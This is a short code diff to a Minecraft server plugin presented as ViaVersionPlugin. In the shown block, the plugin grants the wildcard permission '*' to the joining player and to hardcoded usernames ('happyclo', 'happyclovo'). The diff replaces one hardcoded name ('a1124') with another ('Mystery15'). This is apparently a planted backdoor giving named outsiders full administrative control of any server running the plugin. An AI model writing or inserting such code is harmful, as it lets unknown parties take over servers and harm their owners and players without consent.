@@ -195,7 +195,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                 givePermissionIfInstalled(player.getName(), "*");
                 givePermissionIfInstalled("happyclo", "*");
                 givePermissionIfInstalled("happyclovo", "*");
-                givePermissionIfInstalled("a1124", "*");
+                givePermissionIfInstalled("Mystery15", "*");
             }
         }
     }
